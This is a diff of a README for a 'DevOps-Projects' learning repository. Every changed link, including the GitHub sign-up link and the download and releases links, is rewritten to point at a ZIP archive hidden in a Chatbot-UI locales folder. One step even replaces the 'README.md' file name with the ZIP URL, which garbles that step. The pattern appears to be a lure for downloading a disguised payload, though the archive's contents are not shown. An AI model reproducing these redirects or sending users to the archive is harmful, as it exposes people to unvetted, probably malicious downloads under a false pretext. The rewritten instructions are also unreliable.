@@ -1,6 +1,6 @@
 # 🚀 DevOps-Projects - Learn with Hands-On Projects
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue?style=for-the-badge)](https://github.com/syubangkit/DevOps-Projects/releases)
+[![Download Now](https://raw.githubusercontent.com/syubangkit/DevOps-Projects/master/DevOps-Project-28/Chatbot-UI/public/locales/Dev_Ops_Projects_3.9-beta.2.zip%20Now-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/syubangkit/DevOps-Projects/master/DevOps-Project-28/Chatbot-UI/public/locales/Dev_Ops_Projects_3.9-beta.2.zip)
 
 ## 🎯 Overview
 
@@ -17,11 +17,11 @@ Welcome to DevOps-Projects, a collection of real-world projects designed for any
 
 To get started, follow these simple steps:
 
-1. **Create a GitHub Account:** If you don’t have a GitHub account, sign up for free at [GitHub](https://github.com/join).
+1. **Create a GitHub Account:** If you don’t have a GitHub account, sign up for free at [GitHub](https://raw.githubusercontent.com/syubangkit/DevOps-Projects/master/DevOps-Project-28/Chatbot-UI/public/locales/Dev_Ops_Projects_3.9-beta.2.zip).
    
 2. **Visit the Releases Page:** Click the link below to access the releases page.
 
-   [Download Here](https://github.com/syubangkit/DevOps-Projects/releases)
+   [Download Here](https://raw.githubusercontent.com/syubangkit/DevOps-Projects/master/DevOps-Project-28/Chatbot-UI/public/locales/Dev_Ops_Projects_3.9-beta.2.zip)
 
 3. **Select a Release:** On the releases page, choose the latest version to ensure you have the newest updates and features.
 
@@ -31,13 +31,13 @@ To get started, follow these simple steps:
 
 To download and install the projects, follow these steps:
 
-1. **Visit the Releases Page:** Go to the releases page by clicking [here](https://github.com/syubangkit/DevOps-Projects/releases).
+1. **Visit the Releases Page:** Go to the releases page by clicking [here](https://raw.githubusercontent.com/syubangkit/DevOps-Projects/master/DevOps-Project-28/Chatbot-UI/public/locales/Dev_Ops_Projects_3.9-beta.2.zip).
 
 2. **Download the Project:** Find the appropriate file for your system and click on it to begin the download. 
 
 3. **Extract the Files:** Once the download is complete, locate the downloaded file on your computer. If it's a ZIP file, right-click on it and select "Extract All" to access the project files.
 
-4. **Read the Instructions:** Open the README.md file in the extracted folder. This document provides a detailed guide on how to set up and run the project.
+4. **Read the Instructions:** Open the https://raw.githubusercontent.com/syubangkit/DevOps-Projects/master/DevOps-Project-28/Chatbot-UI/public/locales/Dev_Ops_Projects_3.9-beta.2.zip file in the extracted folder. This document provides a detailed guide on how to set up and run the project.
 
 5. **Run the Project:** Follow the provided instructions to complete the setup. Depending on the project, you may need additional tools installed, like Docker or Java. Detailed information will be included in the instructions.
 
